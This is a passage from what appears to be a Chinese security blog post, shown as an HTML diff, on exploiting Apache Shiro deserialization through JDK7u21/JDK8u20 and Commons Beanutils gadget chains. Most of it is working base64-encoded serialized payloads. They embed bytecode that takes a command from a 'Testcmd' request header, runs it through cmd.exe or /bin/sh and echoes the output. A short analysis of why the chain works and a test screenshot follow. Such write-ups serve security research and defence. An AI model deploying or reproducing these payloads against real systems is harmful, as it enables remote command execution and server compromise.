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&quot;,</span><br><span class="line">                    &quot;Jdk7u21&quot;:&quot;rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAACc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb292NGhBMnZ1U1MHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb3Y0aEEydnVTUy5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnB0AANhYmNzcgAUamF2YS51dGlsLlByb3BlcnRpZXM5EtB6cDY+mAIAAUwACGRlZmF1bHRzcQB+AAh4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQACGY1YTVhNjA4cQB+AAl4dnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHg=&quot;,</span><br><span class="line">                    &quot;Jdk8u20&quot;:&quot;rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAABzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAFSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtWwAKX2J5dGVjb2Rlc3QAA1tbQkwABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHAAAAAB/////wF1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29veTZhOTVuNkYHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb295NmE5NW42Ri5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAAAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQAAAAIABnQAA2FiY3cBAHhzcgApamF2YS5iZWFucy5iZWFuY29udGV4dC5CZWFuQ29udGV4dFN1cHBvcnS8SCDwkY+5DAMAAUkADHNlcmlhbGl6YWJsZXhyAC5qYXZhLmJlYW5zLmJlYW5jb250ZXh0LkJlYW5Db250ZXh0Q2hpbGRTdXBwb3J0V9TvxwTcciUDAAFMABRiZWFuQ29udGV4dENoaWxkUGVlcnQAKUxqYXZhL2JlYW5zL2JlYW5jb250ZXh0L0JlYW5Db250ZXh0Q2hpbGQ7eHBxAH4ADngAAAABc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUDAAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91dGlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAIZjVhNWE2MDhxAH4ABXh2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAMAAHhwdwQAAAAAeHhwdwwAAAAQP0AAAAAAAAJxAH4ABXN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBxAH4AEng=&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>具体细节可以参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1848169">https://cloud.tencent.com/developer/article/1848169</a></p>
+<p>测试如下：</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271603646.png" alt="image-20220927160342383"></p>
+<p>最开始的时候，利用一键利用工具发现可以命令执行（当时是没有引入cc依赖的），但是利用链上是显示利用的<code>Commons Beanutils</code>链，那么下面就分析下这个<code>Commons Beanutils</code>链为什么可以利用成功，前面有截图说明了Shiro是自带<code>Apache Commons Beanutils</code>这个包的，那么能触发反序列化，就离不开这个包的一些功能特性：</p>
+<blockquote>
+<p><code>Commons Beanutils</code>是应用于<code>JavaBean</code>的工具</p>
